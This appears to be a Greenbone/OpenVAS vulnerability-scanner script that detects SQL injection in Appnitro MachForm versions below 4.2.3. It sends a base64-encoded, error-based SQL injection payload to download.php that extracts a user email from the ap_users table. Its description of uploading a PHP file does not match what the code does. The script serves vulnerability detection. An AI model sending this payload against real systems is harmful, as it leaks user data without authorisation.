CPE = "cpe:/a:appnitro:machform";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.141126" );
	script_version( "2021-07-07T08:27:23+0000" );
	script_tag( name: "last_modification", value: "2021-07-07 08:27:23 +0000 (Wed, 07 Jul 2021)" );
	script_tag( name: "creation_date", value: "2018-05-31 09:43:14 +0700 (Thu, 31 May 2018)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2018-06-28 18:11:00 +0000 (Thu, 28 Jun 2018)" );
	script_cve_id( "CVE-2018-6409", "CVE-2018-6410", "CVE-2018-6411" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Appnitro MachForm < 4.2.3 Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_appnitro_machform_detect.sc" );
	script_mandatory_keys( "appnitro/machform/http/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "Appnitro MachForm is prone to multiple vulnerabilities." );
	script_tag( name: "insight", value: "Appnitro MachForm is prone to multiple vulnerabilities:

  - CVE-2018-6409: Path traversal

  - CVE-2018-6410: SQL-Injection

  - CVE-2018-6411: Bypass of file upload filter" );
	script_tag( name: "vuldetect", value: "Tries to upload a PHP file and checks if phpinfo() can be exectuted." );
	script_tag( name: "solution", value: "Update to version 4.2.3 or later." );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/44794/" );
	script_xref( name: "URL", value: "https://metalamin.github.io/MachForm-not-0-day-EN/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/download.php?q=ZWw9IChTRUxFQ1QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMDIwLChTRUxFQ1QgTUlEKCh1c2VyX2VtYWlsKSwxLDUwKSBGUk9NIGFwX3VzZXJzIE9SREVSIEJZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLkNIQVJBQ1RFUl9TRVRTIEdST1VQIEJZIHgpYSkgOyZpZD0xJmhhc2g9MSZmb3JtX2lkPTE=";
req = http_get( port: port, item: url );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(ContainsString( res, "Integrity constraint violation" )){
	report = "The error message retrieved indicates that an SQL Injection was possible.\n\nResponse:\n" + res;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

